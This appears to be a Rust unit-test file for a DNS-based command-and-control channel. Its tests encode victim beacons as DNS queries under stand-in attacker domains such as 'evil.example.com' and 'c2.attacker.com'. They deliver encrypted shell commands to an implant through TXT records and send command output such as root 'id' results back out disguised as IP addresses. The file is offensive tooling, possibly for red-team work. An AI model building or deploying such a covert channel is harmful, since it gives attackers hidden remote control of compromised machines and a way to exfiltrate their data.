use super::*;
use crate::c2_protocol::{BeaconMessage, CommandMessage, CommandType, PayloadType, SessionCipher};

fn test_config() -> DnsC2Config {
    DnsC2Config {
        base_domain: "evil.example.com".to_string(),
        implant_id: "imp42".to_string(),
        max_label_len: 63,
        jitter_ms: 0,
        ttl_secs: 30,
    }
}

fn test_beacon() -> BeaconMessage {
    BeaconMessage {
        implant_id: "imp42".to_string(),
        timestamp: 1700000000,
        hostname: "victim-pc".to_string(),
        username: "admin".to_string(),
        os: "Windows 11".to_string(),
        ip: "192.168.1.50".to_string(),
        payload_type: PayloadType::Checkin,
        data: b"checkin".to_vec(),
    }
}

fn test_command() -> CommandMessage {
    CommandMessage {
        command_id: "cmd-100".to_string(),
        implant_id: "imp42".to_string(),
        command_type: CommandType::Shell,
        args: vec!["id".to_string()],
        timeout_secs: 15,
    }
}

#[test]
fn test_beacon_encode_decode_roundtrip() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let config = test_config();
    let beacon = test_beacon();

    let queries = encode_beacon_as_dns_queries(&beacon, &cipher, &config).expect("encode");
    assert!(!queries.is_empty());

    for q in &queries {
        assert!(q.ends_with(&format!(".imp42.c2.evil.example.com")));
        assert!(q.len() <= MAX_DNS_NAME_LEN + 10); // allow some slack
    }

    let decoded = decode_dns_queries_to_beacon(&queries, &cipher, &config).expect("decode");
    assert_eq!(decoded.implant_id, "imp42");
    assert_eq!(decoded.hostname, "victim-pc");
    assert_eq!(decoded.payload_type, PayloadType::Checkin);
    assert_eq!(decoded.data, b"checkin");
}

#[test]
fn test_beacon_queries_have_sequence_numbers() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let config = test_config();
    let beacon = test_beacon();

    let queries = encode_beacon_as_dns_queries(&beacon, &cipher, &config).expect("encode");
    for (i, q) in queries.iter().enumerate() {
        let expected_prefix = format!("{i:04x}.");
        assert!(
            q.starts_with(&expected_prefix),
            "query {i} should start with {expected_prefix}, got: {q}"
        );
    }
}

#[test]
fn test_command_txt_encode_decode_roundtrip() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let cmd = test_command();

    let txt = encode_command_as_txt(&cmd, &cipher).expect("encode");
    assert!(!txt.is_empty());

    let decoded = decode_txt_to_command(&txt, &cipher).expect("decode");
    assert_eq!(decoded.command_id, "cmd-100");
    assert_eq!(decoded.command_type, CommandType::Shell);
    assert_eq!(decoded.args, vec!["id"]);
    assert_eq!(decoded.timeout_secs, 15);
}

#[test]
fn test_command_txt_wrong_key_fails() {
    let key1 = SessionCipher::generate_key();
    let key2 = SessionCipher::generate_key();
    let cipher1 = SessionCipher::new(&key1);
    let cipher2 = SessionCipher::new(&key2);
    let cmd = test_command();

    let txt = encode_command_as_txt(&cmd, &cipher1).expect("encode");
    assert!(decode_txt_to_command(&txt, &cipher2).is_err());
}

#[test]
fn test_ip_sequence_encode_decode_roundtrip() {
    let data = b"uid=0(root) gid=0(root)";
    let ips = encode_response_as_ip_sequence(data);
    assert!(!ips.is_empty());

    for ip in &ips {
        let parts: Vec<&str> = ip.split('.').collect();
        assert_eq!(parts.len(), 4);
        for part in parts {
            let val: u8 = part.parse().expect("valid octet");
            let _ = val; // just ensure it parses
        }
    }

    let decoded = decode_ip_sequence_to_response(&ips).expect("decode");
    assert_eq!(decoded, data);
}

#[test]
fn test_ip_sequence_empty_data() {
    let ips = encode_response_as_ip_sequence(b"");
    let decoded = decode_ip_sequence_to_response(&ips).expect("decode");
    assert!(decoded.is_empty());
}

#[test]
fn test_ip_sequence_large_data() {
    let data = vec![0xCC_u8; 1024];
    let ips = encode_response_as_ip_sequence(&data);
    let decoded = decode_ip_sequence_to_response(&ips).expect("decode");
    assert_eq!(decoded.len(), 1024);
    assert!(decoded.iter().all(|&b| b == 0xCC));
}

#[test]
fn test_ip_sequence_decode_empty_fails() {
    assert!(decode_ip_sequence_to_response(&[]).is_err());
}

#[test]
fn test_cover_labels() {
    let labels = generate_cover_labels(5);
    assert_eq!(labels.len(), 5);
    assert_eq!(labels[0], "www");
    assert_eq!(labels[1], "mail");
}

#[test]
fn test_mock_dns_server_txt_records() {
    let server = MockDnsServer::new();
    assert!(server.query_txt("test.example.com").is_none());
    server.set_txt_record("test.example.com", "v=spf1 include:_spf.google.com ~all");
    let result = server.query_txt("test.example.com");
    assert_eq!(
        result.as_deref(),
        Some("v=spf1 include:_spf.google.com ~all")
    );
}

#[test]
fn test_mock_dns_server_command_queue() {
    let server = MockDnsServer::new();
    assert!(server.poll_command("imp42").is_none());
    server.queue_command("imp42", "encoded_cmd_1");
    server.queue_command("imp42", "encoded_cmd_2");
    assert_eq!(
        server.poll_command("imp42").as_deref(),
        Some("encoded_cmd_1")
    );
    assert_eq!(
        server.poll_command("imp42").as_deref(),
        Some("encoded_cmd_2")
    );
    assert!(server.poll_command("imp42").is_none());
}

#[test]
fn test_client_server_full_flow() {
    let key = SessionCipher::generate_key();
    let config = test_config();
    let dns = MockDnsServer::new();

    let client = DnsC2Client::new(config.clone(), &key, dns.clone());
    let mut server = DnsC2Server::new(config, &key, dns);

    // Implant sends beacon
    let beacon = test_beacon();
    let queries = client.send_beacon(&beacon).expect("send beacon");

    // Operator receives beacon
    let received = server.receive_beacon(&queries).expect("receive beacon");
    assert_eq!(received.implant_id, "imp42");
    assert_eq!(received.hostname, "victim-pc");
    assert_eq!(server.beacons().len(), 1);

    // Operator sends command
    let cmd = test_command();
    server.send_command(&cmd).expect("send command");

    // Implant polls for command
    let polled = client.poll_command().expect("poll");
    assert!(polled.is_some());
    let polled_cmd = polled.expect("should have command");
    assert_eq!(polled_cmd.command_id, "cmd-100");
    assert_eq!(polled_cmd.command_type, CommandType::Shell);

    // No more commands
    assert!(client.poll_command().expect("poll2").is_none());
}

#[test]
fn test_dns_c2_error_display() {
    let e1 = DnsC2Error::NoCommandPending;
    assert!(e1.to_string().contains("no command pending"));
    let e2 = DnsC2Error::ImplantNotFound("xyz".to_string());
    assert!(e2.to_string().contains("xyz"));
    let e3 = DnsC2Error::PayloadTooLarge;
    assert!(e3.to_string().contains("too large"));
}

#[test]
fn test_dns_c2_config_default() {
    let config = DnsC2Config::default();
    assert_eq!(config.base_domain, "c2.attacker.com");
    assert_eq!(config.max_label_len, 63);
    assert_eq!(config.jitter_ms, 500);
}

#[test]
fn test_beacon_decode_shuffled_queries() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let config = test_config();
    let beacon = test_beacon();

    let mut queries = encode_beacon_as_dns_queries(&beacon, &cipher, &config).expect("encode");
    if queries.len() > 1 {
        queries.reverse();
    }
    let decoded = decode_dns_queries_to_beacon(&queries, &cipher, &config).expect("decode");
    assert_eq!(decoded.implant_id, "imp42");
}

#[test]
fn test_multiple_beacons_independent() {
    let key = SessionCipher::generate_key();
    let config = test_config();
    let dns = MockDnsServer::new();
    let mut server = DnsC2Server::new(config.clone(), &key, dns.clone());
    let client = DnsC2Client::new(config, &key, dns);

    let beacon1 = test_beacon();
    let queries1 = client.send_beacon(&beacon1).expect("send1");
    server.receive_beacon(&queries1).expect("recv1");

    let mut beacon2 = test_beacon();
    beacon2.timestamp = 1700000001;
    beacon2.data = b"second".to_vec();
    let queries2 = client.send_beacon(&beacon2).expect("send2");
    let recv2 = server.receive_beacon(&queries2).expect("recv2");

    assert_eq!(server.beacons().len(), 2);
    assert_eq!(recv2.data, b"second");
}
